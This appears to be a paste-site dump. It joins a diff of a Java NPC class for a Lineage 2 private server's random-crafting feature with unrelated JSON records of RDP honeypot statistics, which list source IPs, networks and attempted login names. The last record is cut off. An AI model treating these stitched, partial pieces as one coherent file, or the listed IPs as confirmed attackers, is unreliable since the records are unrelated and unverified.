+import net.sf.l2j.gameserver.model.actor.Npc;
+import net.sf.l2j.gameserver.model.actor.Player;
+import net.sf.l2j.gameserver.model.actor.template.NpcTemplate;
+import net.sf.l2j.gameserver.model.item.instance.ItemInstance;
+import net.sf.l2j.gameserver.model.item.kind.Item;
+import net.sf.l2j.gameserver.network.serverpackets.ActionFailed;
+import net.sf.l2j.gameserver.network.serverpackets.ExShowScreenMessage;
+import net.sf.l2j.gameserver.network.serverpackets.MagicSkillUse;
+import net.sf.l2j.gameserver.network.serverpackets.MoveToPawn;
+import net.sf.l2j.gameserver.network.serverpackets.MyTargetSelected;
+import net.sf.l2j.gameserver.network.serverpackets.NpcHtmlMessage;
+import net.sf.l2j.gameserver.network.serverpackets.ValidateLocation;
+
+import Base.RandomCraft.RandomCraftItem;
+import Base.RandomCraft.RandomCraftXML;
+
+/**
+ * @author Terius
+ */
+
+public class RandomCraft extends Npc
+{
+	private boolean hasGeneratedItems;
+	List<RandomCraftItem> items = new LinkedList<>();
+	
+	
+	public RandomCraft(int objectId, NpcTemplate template)
+	{
+		super(objectId, template);
+		setHasGeneratedItems(false);
+	}
+	
+	@Override
+	public void onInteract(Player player)
+	{
+		if (this != player.getTarget())
+		{
+			player.setTarget(this);
+			player.sendPacket(new MyTargetSelected(getObjectId(), 0));
+			player.sendPacket(new ValidateLocation(this));
+		}
+		else
+		{
+				// Gira el jugador para enfrentar la instancia
+				player.sendPacket(new MoveToPawn(player, this, Npc.INTERACTION_DISTANCE));
+				
+	
+				
+				loadGeneratedItems(player);
+				
+				showHtmlWindow(player);
+				
+				// Enviar ActionFailed al jugador para evitar quedarse atascado
+				player.sendPacket(ActionFailed.STATIC_PACKET);
+			}
+		}
+	
+	
+	
+    private static String getItemNameById(int id) {
+        Item item = ItemData.getInstance().getTemplate(id);
+        if (item != null) {
+            return item.getName();
+        }
+        return ""Unknown""; // Si no se encuentra el elemento, se devuelve ""Unknown"" como nombre predeterminado
+    }
+	
+	
+	@Override
+	public void onBypassFeedback(Player player, String command)
+	{
+		if (command.startsWith(""refresh""))
+		{
+			// Verifique si el jugador tiene el artículo requerido (ID 57) y la cantidad (50000)
+			ItemInstance item57 = player.getInventory().getItemByItemId(Config.RANDOM_CRAFT_ITEM_ID_CONSUME);
+			if (item57 != null && item57.getCount() >= Config.RANDOM_CRAFT_ITEM_CONSUME_REFRESH)
+			{
+				// Cargue al jugador el artículo requerido (ID 57) y la cantidad (50000)
+				player.destroyItemByItemId(""Random Craft"", Config.RANDOM_CRAFT_ITEM_ID_CONSUME, Config.RANDOM_CRAFT_ITEM_CONSUME_REFRESH, null, true);
+				
+				generateItems(player);
+				
+			
+				
+				
+
+				
+				showHtmlWindow(player);
+				
+				// Almacene los elementos generados en la base de datos para el jugador
+				saveGeneratedItems(player);
+			}
+			else
+			{
+				player.sendMessage(""Necesitas al menos "" + Config.RANDOM_CRAFT_ITEM_CONSUME_REFRESH + "" De: "" +  getItemNameById(Config.RANDOM_CRAFT_ITEM_ID_CONSUME)  + "" para actualizar Random Craft."");
+				showHtmlWindow(player);
+			}
+		}
+		else if (command.startsWith(""create""))
+		{
+			
+			// Carga al jugador el artículo con ID 57 y cantidad 300000
+			ItemInstance item57 = player.getInventory().getItemByItemId(Config.RANDOM_CRAFT_ITEM_ID_CREATE);
+			if (item57 != null && item57.getCount() >= Config.RANDOM_CRAFT_ITEM_CONSUME_CREATE) {
+				// Eliminar los elementos generados para el jugador de la tabla RandomCraftItem
+				deleteGeneratedItems(player);
+				
+				createItem(player);
+			}
+			else {
+				player.sendMessage(""Necesitas al menos "" + Config.RANDOM_CRAFT_ITEM_CONSUME_CREATE + "" De: "" +  getItemNameById(Config.RANDOM_CRAFT_ITEM_ID_CREATE)  + "" para crear un elemento aleatorio."");
+				showHtmlWindow(player);
+			}
+			
+			
+		}
+		
+		else if (command.startsWith(""back""))
+		{
+			
+			showHtmlWindow(player);
+		}
+		
+	}
+	
+	private void generateItems(Player player)
+	{
+		List<RandomCraftItem> items = new LinkedList<>();
+		RandomCraftXML randomCraftXML = RandomCraftXML.getInstance();
+		Map<Integer, RandomCraftItem> craftItems = randomCraftXML.getItems();
+		
+		// Genera 4 elementos únicos para cada jugador en función de la probabilidad
+		List<Integer> selectedItems = new ArrayList<>();
+		while (selectedItems.size() < Config.RANDOM_CRAFT_ITEM_GENERATOR)
+		{
+			int itemId = getRandomItem(craftItems);
+			if (!selectedItems.contains(itemId))
+			{
+				selectedItems.add(itemId);
+				items.add(craftItems.get(itemId));
+			}
+		}
+		
+		// Asignar los elementos generados al jugador
+		player.setGeneratedCraftItems(items);
+		setHasGeneratedItems(true);
+		
+	}
+	
+	private static void deleteGeneratedItems(Player player)
+	{
+		try (Connection con = ConnectionPool.getConnection(); PreparedStatement stmt = con.prepareStatement(""DELETE FROM RandomCraftItem WHERE object_id = ?""))
+		{
+			stmt.setInt(1, player.getObjectId());
+			stmt.execute();
+		}
+		catch (SQLException e)
+		{
+			e.printStackTrace();
+		}
+	}
+	
+	private static void saveGeneratedItems(Player player)
+	{
+		try (Connection con = ConnectionPool.getConnection(); PreparedStatement stmt = con.prepareStatement(""DELETE FROM RandomCraftItem WHERE object_id = ?""))
+		{
+			stmt.setInt(1, player.getObjectId());
+			stmt.execute();
+			
+			try (PreparedStatement insertStmt = con.prepareStatement(""INSERT INTO RandomCraftItem (object_id, item_id, amount, chance, announce) VALUES (?, ?, ?, ?, ?)""))
+			{
+				insertStmt.setInt(1, player.getObjectId());
+				List<RandomCraftItem> items = player.getGeneratedCraftItems();
+				if (items != null)
+				{
+					for (RandomCraftItem item : items)
+					{
+						insertStmt.setInt(2, item.getId());
+						insertStmt.setInt(3, item.getCantidad());
+						insertStmt.setDouble(4, item.getProbabilidad());
+						insertStmt.setBoolean(5, item.getAnnounce());
+						insertStmt.addBatch(); // Agregar la consulta al lote (batch)
+					}
+					insertStmt.executeBatch(); // Ejecutar el lote de consultas
+				}
+			}
+		}
+		catch (SQLException e)
+		{
+			e.printStackTrace();
+		}
+	}
+	
+	private void loadGeneratedItems(Player player)
+	{
+		try (Connection con = ConnectionPool.getConnection(); PreparedStatement stmt = con.prepareStatement(""SELECT item_id, amount, chance, announce FROM RandomCraftItem WHERE object_id = ?""))
+		{
+			stmt.setInt(1, player.getObjectId());
+			
+			try (ResultSet rset = stmt.executeQuery())
+			{
+				List<RandomCraftItem> items = new LinkedList<>();
+				while (rset.next())
+				{
+					int itemId = rset.getInt(""item_id"");
+					int amount = rset.getInt(""amount"");
+					int chance = rset.getInt(""chance"");
+					boolean announce = rset.getBoolean(""announce"");
+					RandomCraftItem item = new RandomCraftItem(itemId, amount, chance, announce);
+					items.add(item);
+				}
+				
+				player.setGeneratedCraftItems(items);
+				setHasGeneratedItems(!items.isEmpty());
+			}
+		}
+		catch (SQLException e)
+		{
+			e.printStackTrace();
+		}
+	}
+	
+	private static int getRandomItem(Map<Integer, RandomCraftItem> craftItems)
+	{
+		// Calcular la suma de probabilidad total
+		double totalProbability = 0;
+		for (RandomCraftItem item : craftItems.values())
+		{
+			totalProbability += item.getProbabilidad();
+		}
+		
+		// Generar un valor aleatorio entre 0 y la probabilidad total
+		Random random = new Random();
+		double randomValue = random.nextDouble() * totalProbability;
+		
+		// Seleccione el elemento en función de la probabilidad
+		double cumulativeProbability = 0;
+		for (RandomCraftItem item : craftItems.values())
+		{
+			cumulativeProbability += item.getProbabilidad();
+			if (randomValue <= cumulativeProbability)
+			{
+				return item.getId();
+			}
+		}
+		
+		// Si no se selecciona ningún artículo, devolver un artículo al azar
+		List<Integer> itemIds = new ArrayList<>(craftItems.keySet());
+		int index = random.nextInt(itemIds.size());
+		return itemIds.get(index);
+	}
+	
+	private void createItem(Player player)
+	{
+		// Comprueba si la lista de elementos está vacía
+		List<RandomCraftItem> items = player.getGeneratedCraftItems();
+		if (items == null || items.isEmpty())
+		{
+			player.sendMessage(""Necesita actualizar para poder crear un elemento aleatorio."");
+			return;
+		}
+		
+		// Obtén un elemento aleatorio de la lista de elementos generados
+		Random random = new Random();
+		int index = random.nextInt(items.size());
+		RandomCraftItem craftItem = items.get(index);
+		
+		// Carga al jugador el artículo con ID 57 y cantidad 300000
+		ItemInstance item57 = player.getInventory().getItemByItemId(Config.RANDOM_CRAFT_ITEM_ID_CREATE);
+		if (item57 != null && item57.getCount() >= Config.RANDOM_CRAFT_ITEM_CONSUME_CREATE)
+		{
+	
+			// Da el artículo al jugador
+			ItemInstance itemInstance = player.getInventory().addItem(""Random Craft"", craftItem.getId(), craftItem.getCantidad(), player, this);
+			if (itemInstance != null)
+			{
+			
+				
+				
+				player.destroyItemByItemId(""Random Craft"", Config.RANDOM_CRAFT_ITEM_ID_CREATE, Config.RANDOM_CRAFT_ITEM_CONSUME_CREATE, null, true);
+				
+
+				
+				// Envía un mensaje al jugador con el nombre del artículo y la cantidad.
+				String message = ""¡Felicidades! Has recibido "" + craftItem.getItem().getName() + "" (Cantidad: "" + craftItem.getCantidad() + "")"";
+				player.sendMessage(message);
+				
+				// Obtén el nombre del jugador que creó el elemento
+				String creatorName = player.getName();
+				
+				// Comprueba si el artículo tiene announce en true en el archivo XML
+				if (craftItem.getAnnounce())
+				{
+					
+					for (Player players : World.getInstance().getPlayers())
+					{
+						
+						String text = creatorName + "" Ha Crafteado: "" + craftItem.getItem().getName() + "" En el RandomCraft System"";
+						
+						players.sendPacket(new ExShowScreenMessage(text, 5000));
+						
+					}
+					
+				}
+				
+				// Agrega un efecto al jugador si el artículo lo permite
+				if (craftItem.getAnnounce())
+				{
+					MagicSkillUse MSU = new MagicSkillUse(player, player, 2024, 1, 1, 0);
+					player.broadcastPacket(MSU);
+				}
+				
+				
+				// Borra la lista de elementos para el jugador
+				player.clearGeneratedCraftItems();
+				setHasGeneratedItems(false);
+				
+				// Muestra la ventana de felicitaciones con el item ganador
+				showCongratulationsWindow(player, craftItem);
+				
+				return;
+			}
+		}
+		player.sendMessage(""Necesitas al menos "" + Config.RANDOM_CRAFT_ITEM_CONSUME_CREATE + "" De: "" +  getItemNameById(Config.RANDOM_CRAFT_ITEM_ID_CREATE)  + "" para crear un elemento aleatorio."");
+		
+	}
+	
+	private void showHtmlWindow(Player player) {
+	    StringBuilder html = new StringBuilder();
+	    
+	    int requiredItemsCount = player.getInventory().getItemCount(Config.RANDOM_CRAFT_ITEM_ID_CREATE);
+	    
+	    html.append(""<html><body>"");
+	    // Agregar información sobre los CraftPoints y la cantidad necesaria
+	    
+	    if(requiredItemsCount > 0) {
+	    	html.append(""<center><font color=\""00FF00\"">CraftPoints: "").append(requiredItemsCount).append(""</font></center>"");
+	    }else {
+	    	html.append(""<center><font color=\""00FF00\"">CraftPoints: "").append(0).append(""</font></center>"");
+	    }
+	   
+	    html.append(""<center><font color=\""FF0000\"">Necesarios: "").append(Config.RANDOM_CRAFT_ITEM_CONSUME_CREATE).append(""</font></center>"");
+	    html.append(""<br>"");
+	    html.append(""<center>Bienvenido a Random Craft System!</center>"");
+	    html.append(""<br>"");
+	    html.append(""<center>Podrás Crear 1 item entre los 5 que salgan random!</center>"");
+	    html.append(""<br>"");
+	    html.append(""<center>Les Deseo Mucha Suerte</center>"");
+	    html.append(""<br>"");
+	    html.append(""<br>"");
+
+	    List<RandomCraftItem> items = player.getGeneratedCraftItems();
+	    if (items == null || items.isEmpty()) {
+	        html.append(""<center>La Lista Esta Vacia. Dale a Refresh</center>"");
+	    } else {
+	        // Generar los iconos de los artículos en forma horizontal
+	        for (RandomCraftItem item : items) {
+	            html.append(""<img src=\""L2UI.SquareGray\"" width=295 height=1>"");
+	            html.append(""<div align=center>"");
+	            html.append(""<table>"");
+	            html.append(""<tr>"");
+	            html.append(""<td>"");
+	            html.append(""<img src="").append(item.getIcon()).append("" width=32 height=32>"");
+	            html.append(""</td>"");
+	            html.append(""<td width=260>"");
+
+	            double chance = item.getProbabilidad();
+	            String color;
+	            String additionalInfo;
+
+	            if (chance <= 25) {
+	                color = ""FF0000""; // Rojo
+	                additionalInfo = "" - Legendary"";
+	            } else if (chance <= 50) {
+	                color = ""9932CC""; // Violeta
+	                additionalInfo = "" - Epic"";
+	            } else {
+	                color = ""FFFF00""; // Amarillo
+	                additionalInfo = "" - Normal"";
+	            }
+
+	            html.append(""<font color="").append(color).append("">"").append(item.getItem().getName()).append("" x"").append(item.getCantidad()).append(additionalInfo).append(""</font>"");
+
+	            html.append(""</td>"");
+	            html.append(""</tr>"");
+	            html.append(""</table>"");
+	            html.append(""</div>"");
+	            html.append(""<img src=\""L2UI.SquareGray\"" width=295 height=1>"");
+	            html.append(""<br>"");
+	        }
+	    }
+
+	    html.append(""<br>"");
+	    html.append(""<br>"");
+	    html.append(""<center>"");
+	    html.append(""<table>"");
+	    html.append(""<tr>"");
+	    html.append(""<td width=75 height=21>"");
+	    html.append(""<button value=\""Refresh\"" action=\""bypass -h npc_"").append(getObjectId()).append(""_refresh\"" width=75 height=21 back=\""L2UI.DefaultButton_click\"" fore=\""L2UI.DefaultButton\"">"");
+	    html.append(""</td>"");
+	    html.append(""<td width=75 height=21>"");
+	    html.append(""<button value=\""Create\"" action=\""bypass -h npc_"").append(getObjectId()).append(""_create\"" width=75 height=21 back=\""L2UI.DefaultButton_click\"" fore=\""L2UI.DefaultButton\"">"");
+	    html.append(""</td>"");
+	    html.append(""</tr>"");
+	    html.append(""</table>"");
+	    html.append(""</center>"");
+
+	    html.append(""</body></html>"");
+
+	    showHtmlWindow(player, html.toString());
+	}
+
+
+	
+	private void showHtmlWindow(Player player, String htmlContent)
+	{
+		NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
+		html.setHtml(htmlContent);
+		
+		player.sendPacket(html);
+	}
+	
+	private void showCongratulationsWindow(Player player, RandomCraftItem craftItem) {
+	    StringBuilder html = new StringBuilder();
+
+	    html.append(""<html><body>"");
+	    html.append(""<center>Felicidades, has ganado un item</center>"");
+	    html.append(""<br>"");
+	    html.append(""<center>¡Has recibido</center>"");
+	    html.append(""<br>"");
+	    html.append(""<br>"");
+	    html.append(""<img src=\""L2UI.SquareGray\"" width=295 height=1>"");
+	    html.append(""<center>"");
+	    html.append(""<table>"");
+	    html.append(""<tr>"");
+	    html.append(""<td>"");
+	    html.append(""<img src="").append(craftItem.getIcon()).append("" width=32 height=32>"");
+	    html.append(""</td>"");
+	    html.append(""<td width=260>"");
+
+	    double chance = craftItem.getProbabilidad();
+	    String color;
+	    String additionalInfo;
+
+	    if (chance <= 25) {
+	        color = ""FF0000""; // Rojo
+	        additionalInfo = "" - Legendary"";
+	    } else if (chance <= 50) {
+	        color = ""9932CC""; // Violeta
+	        additionalInfo = "" - Epic"";
+	    } else {
+	        color = ""FFFF00""; // Amarillo
+	        additionalInfo = "" - Normal"";
+	    }
+
+	    html.append(""<font color="").append(color).append("">"").append(craftItem.getItem().getName()).append("" x"").append(craftItem.getCantidad()).append(additionalInfo).append(""</font>"");
+
+
+	    html.append(""</td>"");
+	    html.append(""</tr>"");
+	    html.append(""</table>"");
+	    html.append(""</center>"");
+	    html.append(""<img src=\""L2UI.SquareGray\"" width=295 height=1>"");
+	    html.append(""<br>"");
+	    html.append(""<br>"");
+	    html.append(""<br>"");
+	    html.append(""<br>"");
+	    html.append(""<center>"");
+	    html.append(""<button value=\""Back\"" action=\""bypass -h npc_"").append(getObjectId()).append(""_back\"" width=75 height=21 back=\""L2UI.DefaultButton_click\"" fore=\""L2UI.DefaultButton\"">"");
+	    html.append(""</center>"");
+	    html.append(""</body></html>"");
+
+	    showHtmlWindow(player, html.toString());
+	}
+
+	
+	/**
+	 * @return the hasGeneratedItems
+	 */
+	public boolean isHasGeneratedItems()
+	{
+		return hasGeneratedItems;
+	}
+	
+	/**
+	 * @param hasGeneratedItems the hasGeneratedItems to set
+	 */
+	public void setHasGeneratedItems(boolean hasGeneratedItems)
+	{
+		this.hasGeneratedItems = hasGeneratedItems;
+	}
+}
"
eaudSc1Y,2024-01-02_stats.json,rdp_snitch,JSON,Tuesday 2nd of January 2024 06:18:16 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 51,
    ""74.105.22.130"": 33,
    ""167.94.145.51"": 3,
    ""216.73.161.161"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""205.210.31.218"": 9,
    ""143.42.69.105"": 3,
    ""65.20.79.184"": 9,
    ""194.165.16.76"": 6,
    ""107.189.160.91"": 6,
    ""109.69.7.157"": 15,
    ""87.251.75.145"": 12,
    ""193.29.13.31"": 3,
    ""62.204.41.208"": 18,
    ""58.218.204.183"": 18,
    ""185.170.144.3"": 6,
    ""123.56.20.194"": 3,
    ""135.125.216.200"": 3,
    ""61.78.123.204"": 3,
    ""198.235.24.241"": 9,
    ""222.252.27.66"": 3,
    ""46.19.139.234"": 3,
    ""124.225.77.47"": 3,
    ""185.190.24.101"": 3,
    ""194.165.16.73"": 6,
    ""45.227.254.9"": 9,
    ""118.193.58.187"": 3,
    ""142.93.95.8"": 12,
    ""157.230.218.253"": 3,
    ""205.210.31.143"": 9,
    ""208.234.0.26"": 12,
    ""87.251.75.64"": 3,
    ""216.73.160.141"": 3,
    ""194.165.16.37"": 6,
    ""205.210.31.78"": 9
  },
  ""asn"": {
    ""AS48721"": 69,
    ""AS701"": 33,
    ""AS398705"": 3,
    ""AS206092"": 6,
    ""AS208046"": 18,
    ""AS396982"": 36,
    ""AS63949"": 3,
    ""AS20473"": 9,
    ""AS53755"": 6,
    ""AS21183"": 15,
    ""AS208091"": 15,
    ""AS42397"": 3,
    ""AS59425"": 18,
    ""AS4134"": 21,
    ""AS197414"": 6,
    ""AS37963"": 3,
    ""AS16276"": 3,
    ""AS4766"": 3,
    ""AS45899"": 3,
    ""AS51852"": 3,
    ""AS211632"": 3,
    ""AS267784"": 9,
    ""AS135377"": 3,
    ""AS14061"": 15,
    ""AS10843"": 12
  },
  ""isp"": {
    ""Flyservers S.A."": 78,
    ""Verizon Business"": 33,
    ""Censys, Inc."": 3,
    ""Ipxo Limited"": 6,
    ""ColocationX Ltd."": 18,
    ""Google LLC"": 36,
    ""Akamai Technologies, Inc."": 3,
    ""The Constant Company"": 9,
    ""Input Output Flood LLC"": 6,
    ""Vodafone Network"": 15,
    ""Xhost Internet Solutions LP"": 21,
    ""Bunea TELECOM SRL"": 3,
    ""Horizon LLC"": 18,
    ""Chinanet"": 18,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""OVH SAS"": 3,
    ""Korea Telecom"": 3,
    ""VietNam Post and Telecom Corporation"": 3,
    ""Private Layer INC"": 3,
    ""Hainan Network of ChinaTelecom"": 3,
    ""Internet Solutions & Innovations LTD."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""DigitalOcean, LLC"": 15,
    ""Advanced Internet Technologies"": 12
  },
  ""org"": {
    ""Flyservers S.A"": 69,
    ""Verizon Business"": 33,
    ""Censys, Inc."": 3,
    ""Bandito Networks"": 6,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Linode"": 3,
    ""Vultr Holdings LLC"": 9,
    ""rdpdaddy.com"": 6,
    ""Unknown"": 18,
    ""Xhost Internet Solutions"": 15,
    ""Bunea TELECOM SRL"": 3,
    ""Horizon LLC"": 18,
    ""Chinanet JS"": 18,
    ""Xhostis"": 6,
    ""Aliyun Computing Co., LTD"": 3,
    ""OVH GmbH"": 3,
    ""Kornet"": 3,
    ""Hanoi Post and Telecom Company"": 3,
    ""Fast Serv Inc."": 3,
    ""Tribeka Web Advisors S.A"": 3,
    ""UAB Host Baltic"": 9,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""DigitalOcean, LLC"": 15,
    ""Verizon Communications"": 12
  },
  ""regionName"": {
    ""Kaunas"": 69,
    ""New Jersey"": 36,
    ""Hesse"": 9,
    ""New York"": 6,
    ""Virginia"": 9,
    ""North Holland"": 30,
    ""California"": 48,
    ""North West"": 3,
    ""Maharashtra"": 9,
    ""Arizona"": 6,
    ""Tirana"": 15,
    ""Timi\u015f"": 3,
    ""Moscow"": 18,
    ""Jiangsu"": 18,
    ""Beijing"": 3,
    ""Seoul"": 3,
    ""Hanoi"": 3,
    ""Bern"": 3,
    ""Hainan"": 3,
    ""Mariehamns stad"": 3,
    ""Vilnius"": 9,
    ""North Carolina"": 12
  },
  ""country"": {
    ""Lithuania"": 78,
    ""United States"": 117,
    ""Germany"": 9,
    ""The Netherlands"": 30,
    ""Singapore"": 3,
    ""India"": 9,
    ""Albania"": 15,
    ""Romania"": 3,
    ""Russia"": 18,
    ""China"": 24,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""Switzerland"": 3,
    ""Aland Islands"": 3
  },
  ""account"": {
    ""142.93.8.59"": 111,
    ""(empty)"": 12,
    ""Domain"": 39,
    ""iWxWQpgHl"": 3,
    ""oZGAdS"": 3,
    ""DkejFO"": 3,
    ""admin"": 3,
    ""hello"": 42,
    ""Test"": 30,
    ""Administr"": 27,
    ""eAOkzIsnP"": 3,
    ""ROIiXf"": 3,
    ""fWajna"": 3,
    ""Administrator"": 3,
    ""335mp1c7"": 12,
    ""beio"": 3,
    ""WxCfpwGti"": 3,
    ""mkPSPA"": 3,
    ""gWZgxe"": 3,
    ""JxOEjhJFj"": 3,
    ""JCDSSa"": 3,
    ""NpOYNB"": 3
  },
  ""keyboard"": {
    ""Unknown"": 318
  },
  ""client_build"": {
    ""Unknown"": 318
  },
  ""client_name"": {
    ""Unknown"": 318
  },
  ""ip_type"": {
    ""Unknown"": 210,
    ""mobile & proxy"": 6,
    ""mobile"": 9,
    ""hosting"": 78,
    ""hosting & proxy"": 15
  }
}"
7sPkGBvi,2024-01-02_stats.json,rdp_snitch,JSON,Tuesday 2nd of January 2024 06:16:05 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 34,
    ""74.105.22.130"": 22,
    ""167.94.145.51"": 2,
    ""216.73.161.161"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""205.210.31.218"": 6,
    ""143.42.69.105"": 2,
    ""65.20.79.184"": 6,
    ""194.165.16.76"": 4,
    ""107.189.160.91"": 4,
    ""109.69.7.157"": 10,
    ""87.251.75.145"": 8,
    ""193.29.13.31"": 2,
    ""62.204.41.208"": 12,
    ""58.218.204.183"": 12,
    ""185.170.144.3"": 4,
    ""123.56.20.194"": 2,
    ""135.125.216.200"": 2,
    ""61.78.123.204"": 2,
    ""198.235.24.241"": 6,
    ""222.252.27.66"": 2,
    ""46.19.139.234"": 2,
    ""124.225.77.47"": 2,
    ""185.190.24.101"": 2,
    ""194.165.16.73"": 4,
    ""45.227.254.9"": 6,
    ""118.193.58.187"": 2,
    ""142.93.95.8"": 8,
    ""157.230.218.253"": 2,
    ""205.210.31.143"": 6,
    ""208.234.0.26"": 8,
    ""87.251.75.64"": 2,
    ""216.73.160.141"": 2,
    ""194.165.16.37"": 4,
    ""205.210.31.78"": 6
  },
  ""asn"": {
    ""AS48721"": 46,
    ""AS701"": 22,
    ""AS398705"": 2,
    ""AS206092"": 4,
    ""AS208046"": 12,
    ""AS396982"": 24,
    ""AS63949"": 2,
    ""AS20473"": 6,
    ""AS53755"": 4,
    ""AS21183"": 10,
    ""AS208091"": 10,
    ""AS42397"": 2,
    ""AS59425"": 12,
    ""AS4134"": 14,
    ""AS197414"": 4,
    ""AS37963"": 2,
    ""AS16276"": 2,
    ""AS4766"": 2,
    ""AS45899"": 2,
    ""AS51852"": 2,
    ""AS211632"": 2,
    ""AS267784"": 6,
    ""AS135377"": 2,
    ""AS14061"": 10,
    ""AS10843"": 8
  },
  ""isp"": {
    ""Flyservers S.A."": 52,
    ""Verizon Business"": 22,
    ""Censys, Inc."": 2,
    ""Ipxo Limited"": 4,
    ""ColocationX Ltd."": 12,
    ""Google LLC"": 24,
    ""Akamai Technologies, Inc."": 2,
    ""The Constant Company"": 6,
    ""Input Output Flood LLC"": 4,
    ""Vodafone Network"": 10,
    ""Xhost Internet Solutions LP"": 14,
    ""Bunea TELECOM SRL"": 2,
    ""Horizon LLC"": 12,
    ""Chinanet"": 12,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""OVH SAS"": 2,
    ""Korea Telecom"": 2,
    ""VietNam Post and Telecom Corporation"": 2,
    ""Private Layer INC"": 2,
    ""Hainan Network of ChinaTelecom"": 2,
    ""Internet Solutions & Innovations LTD."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""DigitalOcean, LLC"": 10,
    ""Advanced Internet Technologies"": 8
  },
  ""org"": {
    ""Flyservers S.A"": 46,
    ""Verizon Business"": 22,
    ""Censys, Inc."": 2,
    ""Bandito Networks"": 4,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Linode"": 2,
    ""Vultr Holdings LLC"": 6,
    ""rdpdaddy.com"": 4,
    ""Unknown"": 12,
    ""Xhost Internet Solutions"": 10,
    ""Bunea TELECOM SRL"": 2,
    ""Horizon LLC"": 12,
    ""Chinanet JS"": 12,
    ""Xhostis"": 4,
    ""Aliyun Computing Co., LTD"": 2,
    ""OVH GmbH"": 2,
    ""Kornet"": 2,
    ""Hanoi Post and Telecom Company"": 2,
    ""Fast Serv Inc."": 2,
    ""Tribeka Web Advisors S.A"": 2,
    ""UAB Host Baltic"": 6,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""DigitalOcean, LLC"": 10,
    ""Verizon Communications"": 8
  },
  ""regionName"": {
    ""Kaunas"": 46,
    ""New Jersey"": 24,
    ""Hesse"": 6,
    ""New York"": 4,
    ""Virginia"": 6,
    ""North Holland"": 20,
    ""California"": 32,
    ""North West"": 2,
    ""Maharashtra"": 6,
    ""Arizona"": 4,
    ""Tirana"": 10,
    ""Timi\u015f"": 2,
    ""Moscow"": 12,
    ""Jiangsu"": 12,
    ""Beijing"": 2,
    ""Seoul"": 2,
    ""Hanoi"": 2,
    ""Bern"": 2,
    ""Hainan"": 2,
    ""Mariehamns stad"": 2,
    ""Vilnius"": 6,
    ""North Carolina"": 8
  },
  ""country"": {
    ""Lithuania"": 52,
    ""United States"": 78,
    ""Germany"": 6,
    ""The Netherlands"": 20,
    ""Singapore"": 2,
    ""India"": 6,
    ""Albania"": 10,
    ""Romania"": 2,
    ""Russia"": 12,
    ""China"": 16,
    ""South Korea"": 2,
    ""Vietnam"": 2,
    ""Switzerland"": 2,
    ""Aland Islands"": 2
  },
  ""account"": {
    ""142.93.8.59"": 74,
    ""(empty)"": 8,
    ""Domain"": 26,
    ""iWxWQpgHl"": 2,
    ""oZGAdS"": 2,
    ""DkejFO"": 2,
    ""admin"": 2,
    ""hello"": 28,
    ""Test"": 20,
    ""Administr"": 18,
    ""eAOkzIsnP"": 2,
    ""ROIiXf"": 2,
    ""fWajna"": 2,
    ""Administrator"": 2,
    ""335mp1c7"": 8,
    ""beio"": 2,
    ""WxCfpwGti"": 2,
    ""mkPSPA"": 2,
    ""gWZgxe"": 2,
    ""JxOEjhJFj"": 2,
    ""JCDSSa"": 2,
    ""NpOYNB"": 2
  },
  ""keyboard"": {
    ""Unknown"": 212
  },
  ""client_build"": {
    ""Unknown"": 212
  },
  ""client_name"": {
    ""Unknown"": 212
  },
  ""ip_type"": {
    ""Unknown"": 140,
    ""mobile & proxy"": 4,
    ""mobile"": 6,
    ""hosting"": 52,
    ""hosting & proxy"": 10
  }
}"
QZvPqqq4,2024-01-02_stats.json,rdp_snitch,JSON,Tuesday 2nd of January 2024 06:15:10 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 17,
    ""74.105.22.130"": 11,
    ""167.94.145.51"": 1,
    ""216.73.161.161"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""205.210.31.218"": 3,
    ""143.42.69.105"": 1,
    ""65.20.79.184"": 3,
    ""194.165.16.76"": 2,
    ""107.189.160.91"": 2,
    ""109.69.7.157"": 5,
    ""87.251.75.145"": 4,
    ""193.29.13.31"": 1,
    ""62.204.41.208"": 6,
    ""58.218.204.183"": 6,
    ""185.170.144.3"": 2,
    ""123.56.20.194"": 1,
    ""135.125.216.200"": 1,
    ""61.78.123.204"": 1,
    ""198.235.24.241"": 3,
    ""222.252.27.66"": 1,
    ""46.19.139.234"": 1,
    ""124.225.77.47"": 1,
    ""185.190.24.101"": 1,
    ""194.165.16.73"": 2,
    ""45.227.254.9"": 3,
    ""118.193.58.187"": 1,
    ""142.93.95.8"": 4,
    ""157.230.218.253"": 1,
    ""205.210.31.143"": 3,
    ""208.234.0.26"": 4,
    ""87.251.75.64"": 1,
    ""216.73.160.141"": 1,
    ""194.165.16.37"": 2,
    ""205.210.31.78"": 3
  },
  ""asn"": {
    ""AS48721"": 23,
    ""AS701"": 11,
    ""AS398705"": 1,
    ""AS206092"": 2,
    ""AS208046"": 6,
    ""AS396982"": 12,
    ""AS63949"": 1,
    ""AS20473"": 3,
    ""AS53755"": 2,
    ""AS21183"": 5,
    ""AS208091"": 5,
    ""AS42397"": 1,
    ""AS59425"": 6,
    ""AS4134"": 7,
    ""AS197414"": 2,
    ""AS37963"": 1,
    ""AS16276"": 1,
    ""AS4766"": 1,
    ""AS45899"": 1,
    ""AS51852"": 1,
    ""AS211632"": 1,
    ""AS267784"": 3,
    ""AS135377"": 1,
    ""AS14061"": 5,
    ""AS10843"": 4
  },
  ""isp"": {
    ""Flyservers S.A."": 26,
    ""Verizon Business"": 11,
    ""Censys, Inc."": 1,
    ""Ipxo Limited"": 2,
    ""ColocationX Ltd."": 6,
    ""Google LLC"": 12,
    ""Akamai Technologies, Inc."": 1,
    ""The Constant Company"": 3,
